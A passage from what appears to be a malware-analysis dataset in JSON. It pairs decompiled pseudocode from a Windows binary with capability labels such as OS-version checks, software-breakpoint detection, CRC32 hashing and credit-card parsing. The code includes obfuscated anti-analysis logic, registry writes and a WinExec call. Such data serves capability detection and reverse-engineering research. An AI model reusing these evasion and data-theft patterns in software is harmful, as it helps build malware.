0xffff);\n    }\n    uVar2 = uVar1 >> 0x10;\n    if (iVar4 < uVar1 >> 0x10) {\n        uVar2 = iVar4 - uVar2 & 0xffff;\n        bVar7 = SBORROW4(uVar2, 1);\n        uVar2 = uVar2 - 1;\n    }\n    else {\n        bVar7 = SBORROW4(iVar4, uVar2);\n        uVar2 = iVar4 - uVar2;\n    }\n    if ((bVar7 == uVar2 < 0) && (bVar7 != uVar2 < 0)) {\n        puVar5 = puVar3 | &stack0xfffffffc;\n        puVar3 = puVar5 + bVar6 * -2 + 1;\n        *puVar5 = uVar1 >> 0x10;\n        uVar2 = uVar2 & 0xffffff00;\n    }\n    *arg_14h = uVar2 + arg_ch;\n    *arg_10h = *(puVar3 + 0x58);\n    return CONCAT44(arg_10h, puVar3);\n}\n",
        "token_count": 1148
    },
    "00401510": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00401510(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "00401ba0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c9c) overlaps instruction at (ram,0x00401c9a)\n// \n// WARNING: Removing unreachable block (ram,0x00401eed)\n\nuint fcn.00401ba0(void)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint8_t extraout_CH;\n    ushort extraout_CX;\n    char extraout_CH_00;\n    ushort extraout_CX_00;\n    uint16_t extraout_DX;\n    int32_t unaff_EBX;\n    uint *puVar9;\n    uint *unaff_EBP;\n    uint32_t unaff_ESI;\n    uint *unaff_EDI;\n    uchar *puVar10;\n    uint *puVar11;\n    uint16_t in_CS;\n    uint8_t in_AF;\n    bool bVar12;\n    bool bVar13;\n    uchar uVar14;\n    char cVar15;\n    uint8_t in_IF;\n    bool bVar16;\n    char cVar17;\n    ulong uVar18;\n    uint *puVar19;\n    uint32_t uVar20;\n    \n    bVar16 = false;\n    uVar5 = fcn.00402cc0(0x410434, 0xd, 0x41f458, 10);\n    bVar12 = (CONCAT31(extraout_CH & 0xb, 0xc) & (unaff_EDI & uVar5) + 0xaf70) == 0;\n    uVar18 = fcn.00402cc0(0x410434, 0xd, 0x41f464, 0x12);\n    if ((bVar12) || (!bVar12)) {\n        puVar19 = 0x4;\n        puVar11 = unaff_EDI;\ncode_r0x00401c16:\n        puVar1 = (uVar18 >> 0x20) + 4;\n        *puVar1 = *puVar1 ^ extraout_CX >> 8;\n        fcn.00402cc0(0x410434, 0xd, 0x41f478, puVar19);\n        uVar14 = extraout_CH_00 + -6 < '\\0';\n        fcn.00402cc0(0x410434, 0xd, 0x41f47c, 0xc);\n        fcn.00402cc0(0x410434, 0xd, 0x41f488, 7);\n        if (!uVar14) goto code_r0x00401c8d;\n    }\n    else {\n        puVar11 = unaff_EDI + 1;\n        uVar8 = in(uVar18 >> 0x20);\n        *unaff_EDI = uVar8;\n        puVar19 = unaff_EDI;\n        if (0 < &stack0xffffffe4) goto code_r0x00401c16;\n        *puVar11 = extraout_CX;\n        *uVar18 = *uVar18 + uVar18;\n        pcVar2 = unaff_ESI - 0x79;\n        *pcVar2 = *pcVar2 + (uVar18 >> 8);\n        uVar14 = *pcVar2 < '\\0';\n        unaff_EBP = *unaff_EBP;\ncode_r0x00401c8d:\n        if (uVar14) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    fcn.00402cc0(0x410434, 0xd, 0x41f490, 0xb);\n    fcn.00402cc0(0x410434, 0xd, 0x41f49c, 0xc);\n    fcn.00402cc0(0x410434, 0xd, 0x41f4a8, 8);\n    fcn.00402cc0(0x410434, 0xd, 0x41f4b0, 0xd);\n    fcn.00402cc0(0x410434, 0xd, 0x41f4c0, 0x18);\n    fcn.00402cc0(0x410434, 0xd, 0x41f4d8, 0x25);\n    fcn.00402cc0(0x410434, 0xd, 0x41f500, 10);\n    fcn.00402cc0(0x410434, 0xd, 0x41f50c, 0xc);\n    fcn.00402cc0(0x410434, 0xd, 0x41f518, 0xd);\n    uVar5 = fcn.00402cc0(0x410434, 0xd, 0x41f528, 6);\n    bVar12 = (uVar5 & 0x11cb) == 0;\n    fcn.00402cc0(0x410434, 0xd, 0x41f530, 5);\n    if ((!bVar12) && (bVar12)) {\n        bVar16 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        in_AF = ((in_AF & 1) * '\\x10' & 0x10) != 0;\n    }\n    fcn.00402cc0(0x410434, 0xd, 0x41f538, 0xd);\n    cVar17 = '\\x01';\n    cVar15 = '\\x01';\n    uVar14 = fcn.00402cc0(0x410434, 0xd, 0x41f548, 0x19);\n    if ((cVar17 == cVar15) && (cVar17 != cVar15)) {\n        unaff_ESI = unaff_ESI - 1;\n        puVar10 = puVar11 | unaff_EBP;\n        puVar11 = puVar10 + bVar16 * -2 + 1;\n        *puVar10 = uVar14;\n    }\n    fcn.00402cc0(0x410434, 0xd, 0x41f564, 0xf);\n    fcn.00402cc0(0x410434, 0xd, 0x41f574, 0xe);\n    fcn.00402cc0(0x410434, 0xd, 0x41f584, 0xd);\n    fcn.00402cc0(0x410434, 0xd, 0x41f594, 0xc);\n    iVar6 = fcn.00402cc0(0x410434, 0xd, 0x41f5a0, 0xf);\n    uVar4 = (unaff_EBX ^ 0x70c5) - iVar6 >> 8 | extraout_CX_00 >> 8;\n    bVar12 = uVar4 < extraout_CX_00;\n    bVar13 = uVar4 == extraout_CX_00;\n    uVar5 = 0xd;\n    uVar20 = 0x410434;\n    uVar7 = fcn.00402cc0(0x410434, 0xd, 0x41f5b0, 0xb);\n    if ((!bVar13) && (bVar13)) {\n        if (bVar12 || unaff_EBX + 1 == 0) goto code_r0x0040201c;\n        in_AF = 9 < (uVar7 & 0xf) | in_AF;\n        piVar3 = (uVar7 & 0xffff0000 | CONCAT11((uVar7 >> 8) + in_AF, uVar7 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar3 = *piVar3 - (unaff_EBX + 1);\n        unaff_ESI = unaff_ESI + 1;\n    }\n    fcn.00402cc0(0x410434, 0xd, 0x41f5bc, 0xb);\n    fcn.00402cc0(0x410434, 0xd, 0x41f5c8, 0xb);\n    uVar20 = puVar11 & 0xffff | unaff_ESI << 0x10;\n    uVar5 = unaff_EBP;\ncode_r0x0040201c:\n    puVar19 = puVar11 & 0xffff0000 | uVar20 & 0xffff;\n    puVar11 = unaff_EBP & 0xffff0000 | uVar5;\n    uVar5 = fcn.00402cc0(0x410434, 0xd, 0x41f5d4, 10);\n    uVar5 = ((uVar5 & 0xff | (uVar5 >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^\n            (extraout_DX & 0xff | (extraout_DX >> 8 | extraout_DX) << 8);\n    bVar12 = uVar5 < 0x4001;\n    bVar13 = uVar5 == 0x4001;\n    uVar7 = 0x402064;\n    fcn.00402cc0(0x410434, 0xd, 0x41f5e0, 0xc);\n    if ((bVar12 || bVar13) || (!bVar12 && !bVar13)) {\n        uVar7 = 0xe;\n    }\n    else {\n        *puVar19 = *(unaff_ESI & 0xffff0000 | uVar20 >> 0x10);\n        puVar11 = 0x6ae181d0;\n        uVar7 = uVar7 & 0xffff0000 | in_CS;\n        puVar19 = puVar19 + bVar16 * -2 + 1;\n    }\n    puVar9 = &stack0xffffffe4;\n    fcn.00402cc0(0x410434, 0xd, 0x41f5ec, uVar7);\n    fcn.00402cc0(0x410434, 0xd, 0x41f5fc, 0x11);\n    fcn.00402cc0(0x410434, 0xd, 0x41f610, 0x13);\n    fcn.00402cc0(0x410434, 0xd, 0x41f624, 0x14);\n    fcn.00402cc0(0x410434, 0xd, 0x41f638, 0x33);\n    fcn.00402cc0(0x410434, 0xd, 0x41f66c, 10);\n    uVar5 = fcn.00402cc0(0x410434, 0xd, 0x41f678, 4);\n    bVar12 = (POPCOUNT((puVar19 & uVar5) + 0xaf70 & 0xc) & 1U) == 0;\n    fcn.00402cc0(0x410434, 0xd, 0x41f67c, 5);\n    if ((!bVar12) && (bVar12)) {\n        cVar15 = '\\x1e';\n        do {\n            puVar11 = puVar11 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar11;\n            cVar15 = cVar15 + -1;\n        } while ('\\0' < cVar15);\n        uVar8 = in(0x78);\n        return uVar8;\n    }\n    fcn.00402cc0(0x410434, 0xd, 0x41f684, 6);\n    fcn.00402cc0(0x410434, 0xd, 0x41f68c, 0xc);\n    fcn.00402cc0(0x410434, 0xd, 0x41f698, 0xc);\n    fcn.00402cc0(0x410434, 0xd, 0x41f6d0, 0x2a);\n    fcn.00402cc0(0x410434, 0xd, 0x41f6fc, 0xb);\n    fcn.00402cc0(0x410434, 0xd, 0x41f758, 0x41);\n    fcn.00402cc0(0x410434, 0xd, 0x41f79c, 0x33);\n    fcn.00402cc0(0x410434, 0xd, 0x41f7d0, 0x4b);\n    fcn.00402cc0(0x410434, 0xd, 0x41f81c, 0x39);\n    fcn.00402cc0(0x410434, 0xd, 0x41f858, 8);\n    uVar8 = fcn.00402cc0(0x410434, 0xd, 0x41f860, 0x14);\n    return uVar8;\n}\n",
        "token_count": 3003
    },
    "00403450": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403450(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x41f4c0, arg_8h);\n    (*pcVar2)(&var_264h, 0x41f4d8, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x41f500;\n    var_30h = 0x41f50c;\n    var_2ch = 0x41f518;\n    var_28h = 0x41f528;\n    var_24h = 0x41f530;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1096
    },
    "00403800": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00403800(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.004036a0(0x80000002, 0x41f638, 0x41f684, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 133
    },
    "00401650": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_314h\n\nbool __cdecl fcn.00401650(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_ch_00;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    int32_t unaff_EBX;\n    uint unaff_ESI;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    int32_t var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar7 = &fcn.00401650::var_10bh;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    bVar8 = false;\n    bVar9 = unaff_EBX == '\\0';\n    uVar3 = fcn.00402720();\n    if ((!bVar9) && (bVar9)) {\n        iVar6 = unaff_EBX + 1;\n        uVar4 = extraout_ECX;\n        iVar5 = puVar7 + 3;\n        if (bVar8 || iVar6 == 0) goto code_r0x004016e1;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar1 = (uVar3 & 0xffff0000 | CONCAT11((uVar3 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - iVar6;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&stack0xfffffef0, 0x104);\n    var_4h = 0;\n    do {\n        var_314h = 0x4016ba;\n        uVar4 = fcn.00403750();\n        var_314h = 0x4016c1;\n        arg_ch_00 = fcn.00403750();\n        var_314h = 0x4016c8;\n        unaff_ESI = fcn.00403750();\n        var_314h = uVar4;\n        fcn.00402d90(arg_10h, uVar4);\n        fcn.00402d90(arg_8h, arg_ch_00);\n        uVar4 = arg_ch;\n        iVar6 = arg_8h;\n        iVar5 = arg_10h;\ncode_r0x004016e1:\n        fcn.00402d90(uVar4, unaff_ESI);\n        pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n        var_314h = iVar5;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&fcn.00401650::var_314h, 0x41f458, &stack0xfffffef0);\n        iVar5 = fcn.004029a0(&fcn.00401650::var_314h);\n        if (iVar5 != 0) {\n            var_314h = iVar6;\n            (*pcVar2)(&fcn.00401650::var_210h, 0x41f464, &stack0xfffffef0);\n            iVar6 = fcn.004029a0(&fcn.00401650::var_210h);\n            if (iVar6 != 0) {\n                var_314h = arg_ch;\n                (*pcVar2)(&fcn.00401650::var_210h, 0x41f464, &stack0xfffffef0);\n                iVar6 = fcn.004029a0(&fcn.00401650::var_210h);\n                if (iVar6 != 0) {\n                    iVar6 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar6 = var_8h;\n    } while (var_4h < 3);\n    var_314h = 4;\n    fcn.00402d90(arg_14h, 4);\n    return iVar6 != 0;\n}\n",
        "token_count": 1042
    },
    "004018c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a50) overlaps instruction at (ram,0x00401a4f)\n// \n// WARNING: Removing unreachable block (ram,0x0040190b)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004018c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t extraout_DH;\n    uint8_t *unaff_EBX;\n    uint *puVar6;\n    uint *puVar7;\n    ushort in_SS;\n    bool bVar8;\n    bool bVar9;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    puVar7 = &var_213h;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    s = 0;\n    puVar7 = &var_10fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    var_ch = 1;\n    *(puVar7 + 2) = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n        (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x41f464);\n        bVar8 = extraout_DH < 0x36;\n        bVar9 = (POPCOUNT(extraout_DH - 0x36) & 1U) == 0;\n        fcn.004033c0(&var_4h, &var_8h);\n        if ((bVar9) || (!bVar9)) break;\n        piVar1 = segment(in_SS, *0x10 + -0x234);\n        if (bVar8) {\n            return *piVar1;\n        }\n    } while (bVar9);\n    uVar3 = fcn.00402e50(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    bVar8 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n    if (uVar3 == 0) {\n        return 0;\n    }\n    if ((bVar8) && (!bVar8)) {\n        puVar7 = &stack0xfffffdd0;\n        cVar2 = '\\x1e';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar6;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        iVar5 = in(0x78);\n        return iVar5;\n    }\n    *0x41f994 = fcn.00404770();\n    iVar5 = fcn.004028b0(&s, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    bVar8 = false;\n    fcn.004030d0();\n    if ((!bVar8) && (bVar8)) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar5 = fcn.00403ab0(0x41f49c);\n    if (iVar5 == -1) {\n        iVar5 = fcn.00403ab0(0x41f490);\n        bVar8 = iVar5 != -1;\n        if (iVar5 == -1) goto code_r0x00401aa9;\n    }\n    iVar5 = fcn.00401620(arg_8h);\n    bVar8 = false;\n    if (iVar5 != 0) {\n        fcn.00403dc0();\n        fcn.00403690();\n        return 1;\n    }\ncode_r0x00401aa9:\n    if ((!bVar8) && (bVar8)) {\n        out(0xbd, iVar5);\n        return iVar5;\n    }\n    iVar4 = fcn.004017b0(arg_8h, &s);\n    iVar5 = var_ch;\n    if (iVar4 == 0) {\n        iVar5 = 0;\n    }\n    bVar8 = iVar5 < 0;\n    bVar9 = iVar5 == 0;\n    if (!bVar9) {\n        iVar4 = fcn.00402de0(arg_8h);\n        bVar8 = iVar4 < 0;\n        bVar9 = iVar4 == 0;\n        if (bVar9) {\n            var_ch = 0;\n            iVar5 = iVar4;\n        }\n    }\n    if ((bVar9 || bVar8) || (!bVar9 && !bVar8)) {\n        bVar9 = iVar5 == 0;\n    }\n    if (bVar9) {\n        iVar5 = fcn.00403450(arg_8h, iVar5);\n        var_ch = iVar5;\n    }\n    if (iVar5 != 0) {\n        fcn.00403690();\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x41f4b0);\n    return iVar5;\n}\n",
        "token_count": 1342
    },
    "00402310": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004025b2) overlaps instruction at (ram,0x004025a9)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00402310(void)\n\n{\n    char *pcVar1;\n    uint *puVar2;\n    ushort uVar3;\n    ushort uVar4;\n    uint16_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint16_t extraout_CX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    int32_t extraout_ECX_05;\n    int32_t iVar8;\n    ushort extraout_DX;\n    int32_t *piVar9;\n    uint extraout_EDX;\n    char cVar10;\n    uint extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    uint32_t unaff_EBX;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    uint unaff_EBP;\n    uint uVar13;\n    uint *unaff_ESI;\n    uint *puVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    ushort in_SS;\n    uchar in_CF;\n    bool bVar18;\n    uchar in_ZF;\n    bool bVar19;\n    uchar uVar20;\n    char cVar21;\n    uchar in_OF;\n    char cVar22;\n    unkbyte10 extraout_ST0;\n    ulong uVar23;\n    unkbyte6 Var24;\n    uint8_t in_stack_00000038;\n    \n    uVar4 = unaff_EBP >> 0x10;\n    fcn.00402cc0(0x410434, 0xd, 0x41f444, 0x11);\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        if (in_OF) {\n            return;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00402cc0(0x410434, 0xd, 0x41f6a4, 0x10);\n    uVar23 = fcn.00402cc0(0x410434, 0xd, 0x41f6b4, 0x1a);\n    piVar9 = uVar23 >> 0x20;\n    *(uVar23 + -0x7ce92414) = extraout_ST0;\n    *piVar9 = *piVar9 + 0xa6adf84;\n    fcn.00402cc0(0x410434, 0xd, 0x41f708, unaff_EBX);\n    fcn.00402cc0(0x410434, 0xd, 0x41f714, 0xb);\n    fcn.00402cc0(0x410434, 0xd, 0x41f720, 8);\n    fcn.00402cc0(0x410434, 0xd, 0x41f728, 9);\n    fcn.00402cc0(0x410434, 0xd, 0x41f734, 9);\n    fcn.00402cc0(0x410434, 0xd, 0x41f740, 9);\n    uVar6 = fcn.00402cc0(0x410434, 0xd, 0x41f74c, 0xc);\n    bVar18 = false;\n    bVar19 = (uVar6 & 0x36a18c5) == 0;\n    uVar23 = fcn.00402cc0(0x410434, 0xd, 0x41f874, 0x47);\n    puVar7 = uVar23;\n    if (!bVar18 && !bVar19) {\n        unaff_EBX = unaff_EBX & 0xffff00ff;\n    }\n    puVar2 = unaff_ESI + 1;\n    *CONCAT22(uVar4, in_SS) = *unaff_ESI;\n    pcVar1 = (uVar23 >> 0x20) + 0xd;\n    *pcVar1 = *pcVar1 + ((extraout_CX & 0xff | (extraout_CX >> 8 | in_stack_00000038) << 8) + 1 >> 8);\n    puVar7[-1] = 0x410434;\n    puVar7[-2] = 0x402500;\n    Var24 = fcn.00402cc0(puVar7[-1], *puVar7, puVar7[1], puVar7[2]);\n    puVar7[10] = Var24;\n    *(puVar7 + 0x26) = Var24 >> 0x20;\n    puVar7[10] = 0x1b;\n    puVar7[9] = 0x41f884;\n    puVar7[8] = 0xd;\n    puVar7[7] = 0x410434;\n    puVar7[6] = 0x402533;\n    uVar23 = fcn.00402cc0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar7[10] = uVar23;\n    puVar7[9] = extraout_ECX;\n    puVar7[8] = uVar23 >> 0x20;\n    puVar7[10] = 0x12;\n    puVar7[9] = 0x41f8a0;\n    puVar7[8] = 0xd;\n    puVar7[7] = 0x410434;\n    puVar7[6] = 0x40256e;\n    uVar6 = fcn.00402cc0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar7[10] = uVar6;\n    puVar7[9] = extraout_ECX_00;\n    bVar18 = false;\n    uVar20 = ((uVar6 ^ 0x687c) & 0x3000) == 0;\n    puVar7[10] = 0x40;\n    puVar7[9] = 0x41f8b4;\n    puVar7[8] = 0xd;\n    puVar7[7] = 0x410434;\n    puVar7[6] = 0x402599;\n    fcn.00402cc0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    if ((!bVar18) && (puVar7[6] = extraout_EDX,  bVar18)) {\n        *(unaff_ESI + 0x43d1773e) = *(unaff_ESI + 0x43d1773e) ^ 0x6a27e95e;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    puVar7[6] = 0xc;\n    puVar7[5] = 0x41f8f4;\n    puVar7[4] = 0xd;\n    puVar7[3] = 0x410434;\n    puVar7[2] = 0x4025c5;\n    fcn.00402cc0(puVar7[3], puVar7[4], puVar7[5], puVar7[6]);\n    puVar14 = puVar2;\n    if ((!uVar20) && (uVar20)) {\n        puVar14 = unaff_ESI + 5;\n        out(*puVar2, extraout_DX);\n    }\n    puVar7[2] = 0xb;\n    puVar7[1] = 0x41f900;\n    *puVar7 = 0xd;\n    puVar7[-1] = 0x410434;\n    puVar7[-2] = 0x4025f0;\n    uVar3 = fcn.00402cc0(puVar7[-1], *puVar7, puVar7[1], puVar7[2]);\n    puVar7[10] = extraout_ECX_01;\n    puVar7[9] = CONCAT22(uVar4, in_SS) + 1;\n    *(puVar7 + 0x22) = uVar3;\n    uVar16 = puVar7[9];\n    puVar7[10] = 4;\n    puVar7[9] = 0x41f90c;\n    puVar7[8] = 0xd;\n    puVar7[7] = 0x410434;\n    puVar7[6] = 0x40262b;\n    uVar23 = fcn.00402cc0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar7[10] = uVar23;\n    puVar7[9] = extraout_ECX_02;\n    puVar7[8] = uVar23 >> 0x20;\n    puVar7[7] = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n    puVar7[6] = puVar7 + 0xb;\n    puVar7[5] = 0x6ae181d0;\n    puVar7[4] = puVar14;\n    puVar7[3] = uVar16;\n    uVar17 = puVar7[3];\n    uVar15 = puVar7[4];\n    uVar13 = puVar7[5];\n    uVar16 = puVar7[7];\n    puVar7[10] = 4;\n    puVar7[9] = 0x41f910;\n    puVar7[8] = 0xd;\n    puVar7[7] = 0x410434;\n    puVar7[6] = 0x402648;\n    uVar23 = fcn.00402cc0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar7[10] = uVar23;\n    puVar7[9] = extraout_ECX_03;\n    puVar7[8] = uVar23 >> 0x20;\n    puVar7[7] = uVar16;\n    puVar7[6] = puVar7 + 0xb;\n    puVar7[5] = uVar13;\n    puVar7[4] = uVar15;\n    puVar7[3] = uVar17;\n    cVar10 = uVar23 >> 0x28;\n    cVar22 = SBORROW1(cVar10, '6');\n    cVar21 = cVar10 + -0x36 < '\\0';\n    bVar18 = cVar10 == '6';\n    uVar13 = puVar7[3];\n    uVar16 = puVar7[7];\n    puVar7[10] = 0xc;\n    puVar7[9] = 0x41f914;\n    puVar7[8] = 0xd;\n    piVar11 = puVar7 + 7;\n    puVar7[7] = 0x410434;\n    puVar7[6] = 0x40266d;\n    fcn.00402cc0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    if ((bVar18 || cVar22 != cVar21) || (!bVar18 && cVar22 == cVar21)) {\n        piVar11 = puVar7 + 6;\n        puVar7[6] = 4;\n    }\n    piVar11[-1] = 0x41f920;\n    piVar11[-2] = 0xd;\n    piVar11[-3] = 0x410434;\n    piVar11[-4] = 0x40268e;\n    uVar4 = fcn.00402cc0(piVar11[-3], piVar11[-2], piVar11[-1], *piVar11);\n    piVar11[4] = extraout_ECX_04;\n    piVar11[3] = uVar13;\n    *(piVar11 + 10) = uVar4;\n    piVar11[4] = 9;\n    piVar11[3] = 0x41f924;\n    piVar11[2] = 0xd;\n    piVar11[1] = 0x410434;\n    *piVar11 = 0x4026c9;\n    uVar5 = fcn.00402cc0(piVar11[1], piVar11[2], piVar11[3], piVar11[4]);\n    piVar11[4] = extraout_EDX_00;\n    uVar5 = (extraout_EDX_00 & 0xff00 | (extraout_EDX_00 & 0x4e | 0x38) & uVar5) & uVar5 ^ 0x3c00;\n    uVar6 = (uVar5 & 0xff | (uVar5 >> 8) + (uVar16 >> 8) << 8) | 0x604;\n    